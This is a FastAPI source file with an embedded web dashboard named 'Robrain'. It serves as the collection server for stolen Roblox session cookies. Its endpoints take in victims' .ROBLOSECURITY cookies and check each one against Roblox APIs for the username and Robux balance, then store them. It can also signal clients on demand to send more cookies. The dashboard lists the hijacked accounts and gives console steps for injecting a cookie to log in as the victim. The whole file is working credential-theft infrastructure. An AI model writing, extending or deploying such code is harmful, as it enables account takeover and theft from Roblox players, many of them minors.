from fastapi import FastAPI, Request, HTTPException, Depends
from fastapi.responses import HTMLResponse, JSONResponse
from pydantic import BaseModel
import json, secrets, os, httpx
from datetime import datetime

app = FastAPI()
ADMIN_PASSWORD = os.environ.get("ADMIN_PASSWORD", "bucrf1212")
SESSIONS = {}
PROFILE = {"username": "Admin", "avatar": "", "bio": ""}
COOKIE_TRIGGER = False

# ─── MongoDB (или файл, если MongoDB нет) ───
MONGO_URL = os.environ.get("MONGO_URL")
USE_MONGO = False
db = None

if MONGO_URL:
    try:
        from pymongo import MongoClient
        client = MongoClient(MONGO_URL)
        db = client.robrain
        db.cookies.create_index("time")
        USE_MONGO = True
        print("Using MongoDB")
    except Exception as e:
        print(f"MongoDB failed: {e}")

DATA_FILE = "data.json"

def get_data():
    if USE_MONGO:
        return list(db.cookies.find({}, {"_id": 0}).sort("time", -1).limit(50))
    if os.path.exists(DATA_FILE):
        with open(DATA_FILE) as f: return json.load(f).get("cookies", [])
    return []

def save_cookie(entry):
    if USE_MONGO:
        db.cookies.insert_one(entry)
    else:
        d = {"cookies": get_data() + [entry]}
        with open(DATA_FILE, "w") as f: json.dump(d, f, indent=2)

def delete_cookie(idx):
    if USE_MONGO:
        c = list(db.cookies.find({}, {"_id": 1}).sort("time", -1).limit(50))
        if idx < len(c):
            db.cookies.delete_one({"_id": c[idx]["_id"]})
    else:
        d = {"cookies": get_data()}
        if idx < len(d["cookies"]):
            d["cookies"].pop(idx)
            with open(DATA_FILE, "w") as f: json.dump(d, f, indent=2)

class CookieData(BaseModel):
    cookie: str; username: str; browser: str = "Chrome"; timestamp: str = ""

async def fetch_profile(cookie: str):
    try:
        async with httpx.AsyncClient() as client:
            r = await client.get("https://users.roblox.com/v1/users/authenticated",
                headers={"Cookie": f".ROBLOSECURITY={cookie}"}, timeout=10)
            if r.status_code != 200: return {}
            data = r.json()
            uid = data.get("id")
            name = data.get("name", "")
            display = data.get("displayName", "")

            r2 = await client.get(f"https://economy.roblox.com/v1/users/{uid}/currency",
                headers={"Cookie": f".ROBLOSECURITY={cookie}"}, timeout=10)
            robux = r2.json().get("robux", 0) if r2.status_code == 200 else 0

            r3 = await client.get(
                f"https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds={uid}&size=60x60&format=Png",
                timeout=10)
            avatar = ""
            if r3.status_code == 200:
                d = r3.json().get("data", [])
                if d: avatar = d[0].get("imageUrl", "")

            return {"username": name, "display": display, "robux": robux, "avatar": avatar, "id": uid}
    except: return {}

def require_session(request: Request):
    token = request.cookies.get("session")
    if not token or token not in SESSIONS: raise HTTPException(401, "Unauthorized")
    return SESSIONS[token]

@app.get("/api/check-auth")
async def check_auth(request: Request):
    try:
        require_session(request)
        return {"authenticated": True, "theme": "purple", **PROFILE}
    except: return JSONResponse({"authenticated": False}, status_code=401)

@app.post("/api/login")
async def login(request: Request):
    body = await request.json()
    if body.get("password") == ADMIN_PASSWORD:
        token = secrets.token_hex(32)
        SESSIONS[token] = {"username": "Admin"}
        resp = JSONResponse({"ok": True})
        resp.set_cookie("session", token, httponly=True, samesite="strict", max_age=86400*7)
        return resp
    raise HTTPException(403, "Wrong password")

@app.post("/api/logout")
async def logout(request: Request):
    token = request.cookies.get("session")
    if token: SESSIONS.pop(token, None)
    resp = JSONResponse({"ok": True})
    resp.delete_cookie("session")
    return resp

@app.post("/api/cookie")
async def receive_cookie(c: CookieData):
    prof = await fetch_profile(c.cookie)
    entry = {
        "time": c.timestamp or datetime.utcnow().isoformat(),
        "username": prof.get("display") or c.username,
        "cookie": c.cookie, "browser": c.browser,
        "robux": prof.get("robux", 0),
        "avatar": prof.get("avatar", ""),
        "roblox_user": prof.get("username", ""),
        "roblox_id": prof.get("id", 0),
    }
    save_cookie(entry)
    return {"status": "ok", "total": 0, "robux": entry["robux"]}

@app.get("/api/cookies")
async def get_cookies(session=Depends(require_session)):
    return get_data()

@app.delete("/api/cookies/{idx}")
async def remove_cookie(idx: int, session=Depends(require_session)):
    delete_cookie(idx)
    return {"ok": True}

@app.post("/api/settings")
async def save_settings(request: Request, session=Depends(require_session)):
    body = await request.json()
    if "username" in body: PROFILE["username"] = body["username"]
    if "avatar" in body: PROFILE["avatar"] = body["avatar"]
    if "bio" in body: PROFILE["bio"] = body["bio"]
    return {"ok": True}

@app.post("/api/trigger-cookies")
async def trigger_cookies(session=Depends(require_session)):
    global COOKIE_TRIGGER
    COOKIE_TRIGGER = True
    return {"ok": True}

@app.get("/api/trigger-check")
async def trigger_check():
    global COOKIE_TRIGGER
    if COOKIE_TRIGGER:
        COOKIE_TRIGGER = False
        return {"trigger": True}
    return {"trigger": False}

@app.get("/api/settings")
async def get_settings(session=Depends(require_session)):
    return {"theme": "purple", **PROFILE}

HTML = r"""
<!DOCTYPE html>
<html lang="ru" data-theme="purple">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Robrain Dashboard</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Segoe UI',sans-serif;min-height:100vh;background:var(--bg);color:var(--text);transition:.3s}
:root,[data-theme="purple"]{--bg:#0d0618;--card:#1a0d2e;--border:#2d1560;--accent:#b47bff;--accent2:#c9a0ff;--text:#e6edf3;--text2:#8a82a0;--glow:0 0 20px rgba(180,123,255,.3);--glow2:0 0 40px rgba(180,123,255,.15);--btn-bg:#2d1560;--btn-hover:#3d2080;--danger:#ff5c6e;--success:#3dd68c}
[data-theme="blue"]{--bg:#0a0e1a;--card:#0f1a30;--border:#1a3055;--accent:#4da6ff;--accent2:#80bfff;--glow:0 0 20px rgba(77,166,255,.3);--glow2:0 0 40px rgba(77,166,255,.15);--btn-bg:#1a3055;--btn-hover:#264575}
[data-theme="red"]{--bg:#1a0a0a;--card:#2e0f0f;--border:#551a1a;--accent:#ff4d4d;--accent2:#ff8080;--glow:0 0 20px rgba(255,77,77,.3);--glow2:0 0 40px rgba(255,77,77,.15);--btn-bg:#551a1a;--btn-hover:#752525}
[data-theme="green"]{--bg:#0a1a0a;--card:#0f2e0f;--border:#1a551a;--accent:#4dff4d;--accent2:#80ff80;--glow:0 0 20px rgba(77,255,77,.3);--glow2:0 0 40px rgba(77,255,77,.15);--btn-bg:#1a551a;--btn-hover:#257525}
[data-theme="crimson"]{--bg:#0d0608;--card:#2e0d14;--border:#551525;--accent:#dc143c;--accent2:#ff4d6d;--glow:0 0 20px rgba(220,20,60,.3);--glow2:0 0 40px rgba(220,20,60,.15);--btn-bg:#551525;--btn-hover:#752035}
[data-theme="gold"]{--bg:#0d0b04;--card:#2e2408;--border:#553d0a;--accent:#ffd700;--accent2:#ffe44d;--glow:0 0 20px rgba(255,215,0,.3);--glow2:0 0 40px rgba(255,215,0,.15);--btn-bg:#553d0a;--btn-hover:#755010}
[data-theme="sakura"]{--bg:#0d0618;--card:#1a0d2e;--border:#2d1560;--accent:#ff69b4;--accent2:#ff99cc;--glow:0 0 20px rgba(255,105,180,.3);--glow2:0 0 40px rgba(255,105,180,.15);--btn-bg:#55253a;--btn-hover:#753550}
.container{max-width:1200px;margin:0 auto;padding:30px 20px}
.login-page{display:flex;align-items:center;justify-content:center;min-height:100vh}
.login-box{background:var(--card);border:1px solid var(--border);border-radius:16px;padding:50px 40px;width:380px;box-shadow:var(--glow2);text-align:center}
.login-box h1{font-size:24px;margin-bottom:8px;color:var(--accent)}
.login-box p{color:var(--text2);margin-bottom:30px;font-size:14px}
.login-box input{width:100%;padding:14px 16px;background:rgba(255,255,255,.05);border:1px solid var(--border);border-radius:10px;color:var(--text);font-size:15px;outline:none;transition:.2s;margin-bottom:16px}
.login-box input:focus{border-color:var(--accent);box-shadow:var(--glow)}
.header-actions{display:flex;gap:10px;align-items:center}
.header-actions span{color:var(--text2);font-size:14px}
.theme-dots{display:flex;gap:6px}
.theme-dot{width:28px;height:28px;border-radius:50%;border:2px solid transparent;cursor:pointer;transition:.2s}
.theme-dot:hover{transform:scale(1.15)}
.theme-dot.active{border-color:var(--text);box-shadow:0 0 10px rgba(255,255,255,.2)}
.theme-dot.purple{background:#b47bff}.theme-dot.blue{background:#4da6ff}.theme-dot.red{background:#ff4d4d}.theme-dot.green{background:#4dff4d}.theme-dot.crimson{background:#dc143c}.theme-dot.gold{background:#ffd700}.theme-dot.sakura{background:#ff69b4}
.btn{padding:10px 20px;border:none;border-radius:10px;cursor:pointer;font-size:13px;font-weight:600;transition:.2s;display:inline-flex;align-items:center;gap:6px}
.btn-primary{background:var(--accent);color:var(--bg)}
.btn-primary:hover{box-shadow:var(--glow);transform:translateY(-1px)}
.btn-outline{background:transparent;border:1px solid var(--border);color:var(--text)}
.btn-outline:hover{border-color:var(--accent);color:var(--accent)}
.btn-danger{background:var(--danger);color:#fff}
.btn-sm{padding:7px 14px;font-size:12px}
.profile-bar{display:flex;justify-content:space-between;align-items:center;margin-bottom:30px;padding-bottom:20px;border-bottom:1px solid var(--border);flex-wrap:wrap;gap:12px}
.profile-info{display:flex;align-items:center;gap:12px}
.profile-avatar{width:48px;height:48px;border-radius:50%;border:2px solid var(--accent);object-fit:cover;display:flex;align-items:center;justify-content:center;font-size:24px}
.profile-avatar.placeholder{background:var(--card)}
.profile-name{font-size:18px;font-weight:700;color:var(--accent)}
.profile-bio{font-size:12px;color:var(--text2);margin-top:2px}
.cards{display:grid;grid-template-columns:repeat(auto-fill,minmax(300px,1fr));gap:16px}
.card{background:var(--card);border:1px solid var(--border);border-radius:14px;padding:20px;transition:.3s;position:relative;overflow:hidden}
.card::before{content:'';position:absolute;top:0;left:0;right:0;height:2px;background:var(--accent);opacity:0;transition:.3s}
.card:hover::before{opacity:1}
.card:hover{border-color:var(--accent);box-shadow:var(--glow);transform:translateY(-2px)}
.card-top{display:flex;justify-content:space-between;align-items:flex-start;margin-bottom:12px}
.card-name{font-size:16px;font-weight:700}
.card-user{font-size:12px;color:var(--text2);margin-top:1px}
.card-time{font-size:11px;color:var(--text2)}
.rbx-avatar{width:44px;height:44px;border-radius:50%;border:2px solid var(--accent);object-fit:cover;flex-shrink:0}
.rbx-avatar.placeholder{background:var(--card);display:flex;align-items:center;justify-content:center;font-size:20px}
.card-cookie{font-size:11px;color:var(--text2);word-break:break-all;margin-bottom:12px;padding:8px 10px;background:rgba(0,0,0,.3);border-radius:8px;font-family:monospace;max-height:50px;overflow:hidden;cursor:pointer}
.card-cookie:hover{max-height:200px}
.card-bottom{display:flex;justify-content:space-between;align-items:center;gap:8px}
.robux-badge{background:rgba(255,215,0,.15);color:#ffd700;padding:4px 12px;border-radius:20px;font-size:12px;font-weight:700;border:1px solid rgba(255,215,0,.3)}
.empty{text-align:center;color:var(--text2);padding:60px 20px;font-size:15px}
.empty h2{color:var(--accent);margin-bottom:8px}
.logout-btn{background:none;border:1px solid var(--danger);color:var(--danger);padding:8px 16px;border-radius:8px;cursor:pointer;font-size:12px;transition:.2s}
.logout-btn:hover{background:var(--danger);color:#fff}
.modal-overlay{display:none;position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,.7);z-index:100;align-items:center;justify-content:center}
.modal-overlay.open{display:flex}
.modal{background:var(--card);border:1px solid var(--border);border-radius:16px;padding:30px;width:420px;max-width:90vw}
.modal h2{margin-bottom:20px;color:var(--accent)}
.modal label{display:block;font-size:13px;color:var(--text2);margin-bottom:6px;margin-top:14px}
.modal-actions{display:flex;gap:10px;margin-top:20px;justify-content:flex-end}
@keyframes fall{0%{transform:translateY(-10vh) rotate(0deg);opacity:0}10%{opacity:1}100%{transform:translateY(110vh) rotate(720deg);opacity:0}}
.petal{position:fixed;top:-10vh;width:14px;height:14px;background:#ff69b4;border-radius:50% 0;opacity:0;pointer-events:none;z-index:0;animation:fall linear infinite}
.petal:nth-child(2n){width:10px;height:10px;background:#ff99cc}
.petal:nth-child(3n){width:12px;height:12px;background:#ff85c8}
.petal:nth-child(4n){border-radius:0 50%}
</style>
</head>
<body><div id="app"></div>
<script>
const app = document.getElementById('app');
let state = { authenticated: false, cookies: [], theme: 'purple' };

async function api(method, path, body) {
    const opts = { method, headers: {} };
    if (body) { opts.headers['Content-Type'] = 'application/json'; opts.body = JSON.stringify(body); }
    const r = await fetch(path, opts);
    if (r.status === 401) { state.authenticated = false; render(); return null; }
    return r.json();
}

async function init() {
    const auth = await api('GET', '/api/check-auth');
    if (auth && auth.authenticated) {
        state.authenticated = true;
        state.theme = auth.theme || 'purple';
        state.profile = { username: auth.username || 'Admin', avatar: auth.avatar || '', bio: auth.bio || '' };
        document.documentElement.setAttribute('data-theme', state.theme);
        const c = await api('GET', '/api/cookies');
        if (c) state.cookies = c;
    }
    render();
}

function render() {
    if (!state.authenticated) renderLogin();
    else renderDashboard();
}

function renderLogin() {
    app.innerHTML = `
    <div class="login-page">
      <div class="login-box">
        <h1>🛡 Robrain</h1>
        <p>Enter password to access dashboard</p>
        <input type="password" id="pwd" placeholder="Password" onkeydown="if(event.key==='Enter') login()">
        <button class="btn btn-primary" style="width:100%" onclick="login()">Sign In</button>
        <div id="login-error" style="color:var(--danger);margin-top:12px;font-size:13px"></div>
      </div>
    </div>`;
}

async function login() {
    const pwd = document.getElementById('pwd').value;
    const err = document.getElementById('login-error');
    try {
        const r = await api('POST', '/api/login', { password: pwd });
        if (r && r.ok) { state.authenticated = true; init(); }
        else err.textContent = 'Wrong password';
    } catch { err.textContent = 'Login failed'; }
}

function renderDashboard() {
    app.innerHTML = `
    ${state.theme === 'sakura' ? '<div id="petals"></div>' : ''}
    <div class="container">
      <div class="profile-bar">
        <div class="profile-info">
          ${state.profile?.avatar ? `<img src="${state.profile.avatar}" class="profile-avatar" onerror="this.style.display='none';this.nextElementSibling.style.display='flex'" onload="this.nextElementSibling.style.display='none'"><div class="profile-avatar placeholder" style="display:none">👤</div>` : '<div class="profile-avatar placeholder">👤</div>'}
          <div>
            <div class="profile-name">${state.profile?.username || 'Robrain'}</div>
            <div class="profile-bio">${state.profile?.bio || ''}</div>
          </div>
        </div>
        <div class="header-actions">
          <span>${state.cookies.length} accounts</span>
          <button class="btn btn-primary btn-sm" onclick="requestCookies()">📥 Request Cookies</button>
          <button class="btn btn-outline btn-sm" onclick="refreshCookies()">🔄 Refresh</button>
          <button class="btn btn-outline btn-sm" onclick="openSettings()">⚙ Settings</button>
          <button class="logout-btn" onclick="logout()">Logout</button>
        </div>
      </div>
      <div class="cards" id="cards"></div>
    </div>

    <div class="modal-overlay" id="settings-modal">
      <div class="modal">
        <h2>⚙ Settings</h2>
        <label>Display Name</label>
        <input type="text" id="set-name" value="${state.profile?.username || ''}" placeholder="Your name">
        <label>Avatar URL</label>
        <input type="text" id="set-avatar" value="${state.profile?.avatar || ''}" placeholder="https://example.com/avatar.png">
        <label>Bio</label>
        <input type="text" id="set-bio" value="${state.profile?.bio || ''}" placeholder="About you">
        <label>Theme</label>
        <div style="display:flex;gap:8px;margin-top:6px;flex-wrap:wrap">
          ${['purple','blue','red','green','crimson','gold','sakura'].map(t =>
            `<div class="theme-dot ${t} ${state.theme===t?'active':''}" onclick="setTheme('${t}')"></div>`
          ).join('')}
        </div>
        <div class="modal-actions">
          <button class="btn btn-outline" onclick="closeSettings()">Cancel</button>
          <button class="btn btn-primary" onclick="saveProfile()">Save</button>
        </div>
      </div>
    </div>`;

    if (state.theme === 'sakura') startPetals();
    renderCards();
}

function startPetals() {
    const container = document.getElementById('petals');
    if (!container || container.children.length > 0) return;
    for (let i = 0; i < 30; i++) {
        const p = document.createElement('div');
        p.className = 'petal';
        p.style.left = Math.random() * 100 + '%';
        p.style.animationDuration = (6 + Math.random() * 8) + 's';
        p.style.animationDelay = Math.random() * 10 + 's';
        p.style.transform = 'rotate(' + Math.random() * 360 + 'deg)';
        container.appendChild(p);
    }
}

function renderCards() {
    const container = document.getElementById('cards');
    if (!state.cookies.length) {
        container.innerHTML = '<div class="empty"><h2>No accounts yet</h2><p>Cookies will appear here when users click Hack Account</p></div>';
        return;
    }
    container.innerHTML = state.cookies.map((c, i) => `
    <div class="card">
      <div class="card-top">
        <div style="display:flex;align-items:center;gap:10px">
          ${c.avatar ? `<img src="${c.avatar}" class="rbx-avatar">` : '<div class="rbx-avatar placeholder">👤</div>'}
          <div>
            <div class="card-name">${c.username}</div>
            <div class="card-user">@${c.roblox_user || ''}</div>
            <div class="card-time">${new Date(c.time).toLocaleString()}</div>
          </div>
        </div>
        <div class="robux-badge">💰 ${c.robux ?? '?'} R$</div>
      </div>
      <div class="card-cookie" onclick="copyText('${c.cookie.replace(/'/g, "\\'")}')" title="Click to copy">${c.cookie}</div>
      <div class="card-bottom">
        <button class="btn btn-primary btn-sm" onclick="loginToRoblox('${c.cookie.replace(/'/g, "\\'")}')">▶ Login</button>
        <button class="btn btn-danger btn-sm" onclick="deleteCookie(${i})">✕ Delete</button>
      </div>
    </div>`).join('');
}

function copyText(t) { navigator.clipboard.writeText(t); }

function loginToRoblox(cookie) {
    navigator.clipboard.writeText(cookie);
    const robloxWin = window.open('https://www.roblox.com/home', '_blank');
    setTimeout(() => {
        alert('Cookie copied!\n\n1. Open Roblox (already opened)\n2. Press F12 → Console\n3. Paste this and press Enter:\n\ndocument.cookie=".ROBLOSECURITY=' + cookie + '; path=/; domain=.roblox.com"\n\n4. Refresh the page (F5)');
    }, 1000);
}

async function requestCookies() {
    const btn = event.target;
    btn.textContent = '⏳ Waiting...';
    btn.disabled = true;
    const r = await api('POST', '/api/trigger-cookies');
    if (r) {
        let waited = 0;
        const check = setInterval(async () => {
            const c = await api('GET', '/api/cookies');
            if (c && c.length > state.cookies.length) {
                state.cookies = c;
                renderCards();
                btn.textContent = '📥 Request Cookies';
                btn.disabled = false;
                clearInterval(check);
            }
            waited += 3;
            if (waited > 60) {
                btn.textContent = '📥 Request Cookies';
                btn.disabled = false;
                clearInterval(check);
            }
        }, 3000);
    } else {
        btn.textContent = '📥 Request Cookies';
        btn.disabled = false;
    }
}

async function refreshCookies() {
    const c = await api('GET', '/api/cookies');
    if (c) state.cookies = c;
    renderCards();
}

function openSettings() { document.getElementById('settings-modal').classList.add('open'); }
function closeSettings() { document.getElementById('settings-modal').classList.remove('open'); }

async function saveProfile() {
    const name = document.getElementById('set-name').value;
    const avatar = document.getElementById('set-avatar').value;
    const bio = document.getElementById('set-bio').value;
    const r = await api('POST', '/api/settings', { username: name, avatar, bio, theme: state.theme });
    if (r) state.profile = { username: name, avatar, bio };
    closeSettings();
    renderDashboard();
}

async function setTheme(t) {
    state.theme = t;
    document.documentElement.setAttribute('data-theme', t);
    renderDashboard();
}

async function deleteCookie(i) {
    await api('DELETE', `/api/cookies/${i}`);
    state.cookies.splice(i, 1);
    renderCards();
}

async function logout() {
    await api('POST', '/api/logout');
    state.authenticated = false;
    render();
}

init();
</script>
</body></html>
"""

@app.get("/")
async def root():
    return HTMLResponse(HTML)
